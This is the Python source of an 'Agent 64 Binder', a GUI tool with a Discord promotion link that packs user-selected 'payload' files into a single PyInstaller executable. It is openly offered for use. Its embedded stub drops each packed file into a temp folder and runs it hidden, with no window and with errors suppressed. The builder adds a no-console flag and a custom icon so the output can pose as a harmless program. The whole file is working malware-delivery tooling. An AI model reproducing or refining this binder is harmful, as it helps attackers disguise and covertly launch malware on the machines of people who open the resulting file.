import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import os
import sys
import base64
import zlib
import shutil
import subprocess
import tempfile
from datetime import datetime

# ====================== STUB ======================
STUB_CODE = r'''
import os, tempfile, subprocess, base64, zlib

def extract_and_run():
    payloads = {payloads_data}
    temp_dir = tempfile.mkdtemp(prefix="agent64_")
    for name, data in payloads.items():
        path = os.path.join(temp_dir, name)
        try:
            with open(path, "wb") as f:
                f.write(zlib.decompress(base64.b64decode(data)))
            subprocess.Popen([path], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

if __name__ == "__main__":
    extract_and_run()
'''

class Agent64VOSG:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Agent 64 Binder")
        self.root.geometry("1080x740")
        self.root.configure(bg="#0a0000")
        
        try:
            self.root.iconbitmap("agent64.ico")
        except:
            pass
        
        self.files = []
        self.icon_path = tk.StringVar()
        self.setup_gui()
    
    def setup_gui(self):
        sidebar = tk.Frame(self.root, bg="#1a0000", width=230)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)
        
        tk.Label(sidebar, text="AGENT 64", font=("Consolas", 26, "bold"), fg="#ff0000", bg="#1a0000").pack(pady=40)
        tk.Label(sidebar, text="ELITE BINDER", font=("Consolas", 11), fg="#aa0000", bg="#1a0000").pack()
        
        # Discord Link
        discord_label = tk.Label(sidebar, text="https://discord.gg/HSnCEu9mDz", 
                                font=("Consolas", 11, "underline"), fg="#00ff00", bg="#1a0000", cursor="hand2")
        discord_label.pack(pady=30)
        discord_label.bind("<Button-1>", self.copy_discord)
        
        tk.Label(sidebar, text="Credit Larp3x", font=("Consolas", 12, "bold"), fg="#00ff00", bg="#1a0000").pack(pady=20)
        
        main = tk.Frame(self.root, bg="#0a0000")
        main.pack(side="right", fill="both", expand=True)
        
        tk.Label(main, text="AGENT 64 BINDER", font=("Consolas", 28, "bold"), fg="#ff0000", bg="#0a0000").pack(pady=25)
        
        frame = tk.LabelFrame(main, text=" LOADED PAYLOADS ", fg="#ff0000", bg="#0a0000", font=("Consolas", 14, "bold"))
        frame.pack(fill="both", expand=True, padx=25, pady=10)
        
        self.listbox = tk.Listbox(frame, bg="#1a0000", fg="#00ffcc", font=("Consolas", 12), selectbackground="#8b0000", height=12)
        self.listbox.pack(fill="both", expand=True, padx=15, pady=15)
        
        ctrl = tk.Frame(main, bg="#0a0000")
        ctrl.pack(pady=10)
        tk.Button(ctrl, text="ADD PAYLOADS", bg="#8b0000", fg="white", font=("Consolas", 11, "bold"), width=18, command=self.add_files).pack(side="left", padx=10)
        tk.Button(ctrl, text="REMOVE", bg="#8b0000", fg="white", font=("Consolas", 11, "bold"), command=self.remove_selected).pack(side="left", padx=10)
        tk.Button(ctrl, text="CLEAR ALL", bg="#8b0000", fg="white", font=("Consolas", 11, "bold"), command=self.clear_all).pack(side="left", padx=10)
        
        settings = tk.Frame(main, bg="#0a0000")
        settings.pack(pady=15, fill="x", padx=30)
        
        tk.Label(settings, text="EXE Name:", fg="#ff0000", bg="#0a0000", font=("Consolas", 11)).grid(row=0, column=0, sticky="w", padx=10, pady=8)
        self.out_name = tk.Entry(settings, width=40, bg="#1a0000", fg="#00ffcc", font=("Consolas", 11))
        self.out_name.insert(0, f"agent64_{datetime.now().strftime('%Y%m%d_%H%M')}")
        self.out_name.grid(row=0, column=1, padx=10, pady=8)
        
        tk.Label(settings, text="EXE Icon:", fg="#ff0000", bg="#0a0000", font=("Consolas", 11)).grid(row=1, column=0, sticky="w", padx=10, pady=8)
        tk.Entry(settings, textvariable=self.icon_path, width=40, bg="#1a0000", fg="#00ffcc").grid(row=1, column=1, padx=10, pady=8)
        tk.Button(settings, text="Browse", bg="#8b0000", fg="white", command=self.browse_icon).grid(row=1, column=2, padx=5)
        
        self.bind_btn = tk.Button(main, text="▶ EXECUTE BINDING", font=("Consolas", 18, "bold"),
                                 bg="#ff0000", fg="#ffffff", height=2, command=self.bind)
        self.bind_btn.pack(pady=25, fill="x", padx=80)
        
        cons = tk.LabelFrame(main, text=" CONSOLE ", fg="#ff0000", bg="#0a0000", font=("Consolas", 11))
        cons.pack(fill="x", padx=30, pady=5)
        self.console = tk.Text(cons, height=7, bg="#000000", fg="#00ff00", font=("Consolas", 10))
        self.console.pack(fill="x", padx=12, pady=8)
        
        self.status = tk.Label(main, text="READY FOR OPERATION", fg="#00ff00", bg="#0a0000", font=("Consolas", 12, "bold"))
        self.status.pack(pady=10)
        
        self.log("AGENT 64 INITIALIZED")
    
    def copy_discord(self, event=None):
        link = "https://discord.gg/HSnCEu9mDz"
        self.root.clipboard_clear()
        self.root.clipboard_append(link)
        self.root.update()
        messagebox.showinfo("Copied", "Discord link copied to clipboard!\n\nJoin us now")
        self.log("Discord link copied to clipboard")
    
    def browse_icon(self):
        path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
        if path:
            self.icon_path.set(path)
            self.log(f"Icon selected: {os.path.basename(path)}")
    
    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{ts}] [+] {msg}\n")
        self.console.see(tk.END)
    
    def add_files(self):
        for p in filedialog.askopenfilenames():
            if p not in [x[1] for x in self.files]:
                self.files.append((os.path.basename(p), p))
                self.listbox.insert(tk.END, f"[+] {os.path.basename(p)}")
        self.log("Payloads loaded")
    
    def remove_selected(self):
        if sel := self.listbox.curselection():
            self.listbox.delete(sel[0])
            del self.files[sel[0]]
            self.log("Payload removed")
    
    def clear_all(self):
        self.files.clear()
        self.listbox.delete(0, tk.END)
        self.log("All payloads cleared")
    
    def bind(self):
        if not self.files:
            messagebox.showwarning("Agent 64", "Load payloads first")
            return
        
        self.status.config(text="COMPILING...")
        self.bind_btn.config(state="disabled")
        self.log("Starting binding process...")
        self.root.update()
        
        fd, temp_py = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        
        payloads = {}
        for name, path in self.files:
            with open(path, "rb") as f:
                data = base64.b64encode(zlib.compress(f.read())).decode()
            payloads[name] = data
            if "primary.exe" not in payloads:
                payloads["primary.exe"] = data
        
        code = STUB_CODE.replace("{payloads_data}", str(payloads))
        with open(temp_py, "w", encoding="utf-8") as f:
            f.write(code)
        
        exe_name = self.out_name.get().strip()
        if not exe_name.endswith(".exe"):
            exe_name += ".exe"
        base_name = exe_name[:-4]
        
        cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--clean", "--name", base_name, temp_py]
        
        icon = self.icon_path.get().strip()
        if icon and os.path.exists(icon):
            cmd.extend(["--icon", icon])
            self.log("Custom icon applied")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            if result.returncode == 0:
                final = os.path.join("dist", exe_name)
                self.status.config(text="BINDING SUCCESS")
                self.log(f"Created: {exe_name}")
                messagebox.showinfo("Success", f"Binding Completed!\n\n{final}")
            else:
                self.log("Binding failed")
                messagebox.showerror("Error", "Check console")
        except Exception as e:
            self.log(f"Error: {e}")
        finally:
            self.bind_btn.config(state="normal")
            try:
                if os.path.exists(temp_py): os.unlink(temp_py)
                for d in ["build", "__pycache__"]:
                    if os.path.exists(d): shutil.rmtree(d, ignore_errors=True)
            except:
                pass

if __name__ == "__main__":
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    Agent64VOSG().root.mainloop()
